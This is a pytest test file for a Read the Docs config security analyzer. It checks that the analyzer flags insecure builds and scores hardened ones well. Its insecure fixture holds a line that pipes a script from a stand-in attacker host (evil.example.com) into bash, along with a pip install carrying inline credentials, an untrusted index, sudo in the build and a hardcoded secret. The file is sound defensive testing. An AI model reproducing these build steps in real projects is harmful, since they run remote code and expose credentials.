"""Tests for ReadTheDocsAnalyzer."""

from pathlib import Path

from devai.readthedocs_analyzer import ReadTheDocsAnalyzer, ReadTheDocsFinding


INSECURE_RTD = """\
version: 2

build:
  os: ubuntu-22.04
  tools:
    python: "3.11"
  jobs:
    post_install:
      - curl http://evil.example.com/install.sh | bash
      - pip install git+https://user:secretpass@github.com/org/private-repo
      - pip install --index-url http://insecure.pypi.example/simple mypkg
      - sudo apt-get install suspicious-package

python:
  install:
    - requirements: docs/requirements.txt

sphinx:
  configuration: docs/conf.py

submodules:
  include: all

environment:
  SECRET_TOKEN: hardcoded-secret-value
"""

HARDENED_RTD = """\
version: 2

build:
  os: ubuntu-22.04
  tools:
    python: "3.12"

python:
  install:
    - requirements: docs/requirements.txt

sphinx:
  configuration: docs/conf.py

submodules:
  include: []
"""


class TestReadTheDocsAnalyzer:
    def test_detects_insecure_readthedocs_yaml(self, tmp_path: Path):
        (tmp_path / ".readthedocs.yaml").write_text(INSECURE_RTD, encoding="utf-8")
        analyzer = ReadTheDocsAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        kinds = {f.kind for f in findings}
        assert "pipe_to_shell" in kinds
        assert "git_install_credentials" in kinds
        assert "pip_untrusted_url" in kinds
        assert "submodules_all" in kinds
        assert "env_secret_inline" in kinds
        assert "sudo_in_build" in kinds
        assert analyzer.health_score() < 50.0

    def test_hardened_readthedocs_scores_well(self, tmp_path: Path):
        (tmp_path / ".readthedocs.yaml").write_text(HARDENED_RTD, encoding="utf-8")
        analyzer = ReadTheDocsAnalyzer(str(tmp_path))
        analyzer.analyze()
        assert analyzer.health_score() >= 90.0

    def test_readthedocs_yml_also_scanned(self, tmp_path: Path):
        (tmp_path / ".readthedocs.yml").write_text(
            "submodules:\n  include: all\n",
            encoding="utf-8",
        )
        analyzer = ReadTheDocsAnalyzer(str(tmp_path))
        findings = analyzer.analyze()
        assert len(analyzer.config_files()) == 1
        assert any(f.kind == "submodules_all" for f in findings)

    def test_no_configs_returns_perfect_score(self, tmp_path: Path):
        analyzer = ReadTheDocsAnalyzer(str(tmp_path))
        analyzer.analyze()
        assert analyzer.health_score() == 100.0
        assert analyzer.stats.config_files == 0

    def test_generate_hardened_template(self):
        template = ReadTheDocsAnalyzer(".").generate_hardened_template()
        assert "version: 2" in template
        assert "include: []" in template

    def test_finding_format(self):
        finding = ReadTheDocsFinding(
            kind="pipe_to_shell",
            severity="high",
            message="test message",
            path=".readthedocs.yaml",
            lineno=10,
        )
        assert "high" in finding.format()
        assert ".readthedocs.yaml:10" in finding.format()

    def test_to_context(self, tmp_path: Path):
        (tmp_path / ".readthedocs.yaml").write_text(
            "submodules:\n  include: all\n",
            encoding="utf-8",
        )
        analyzer = ReadTheDocsAnalyzer(str(tmp_path))
        context = analyzer.to_context()
        assert "Read the Docs analysis:" in context
        assert "submodules include: all" in context

    def test_summary(self, tmp_path: Path):
        (tmp_path / ".readthedocs.yaml").write_text(
            "submodules:\n  include: all\n",
            encoding="utf-8",
        )
        analyzer = ReadTheDocsAnalyzer(str(tmp_path))
        summary = analyzer.summary()
        assert "Read the Docs configs:" in summary
        assert "1 file(s)" in summary

    def test_project_health_integration(self, tmp_path: Path):
        from devai.project_health import ProjectHealth

        (tmp_path / ".readthedocs.yaml").write_text(
            "submodules:\n  include: all\n",
            encoding="utf-8",
        )
        report = ProjectHealth(str(tmp_path)).analyze()
        rtd = next(c for c in report.categories if c.name == "readthedocs")
        assert rtd.score < 100.0
        assert rtd.details.get("findings", 0) > 0
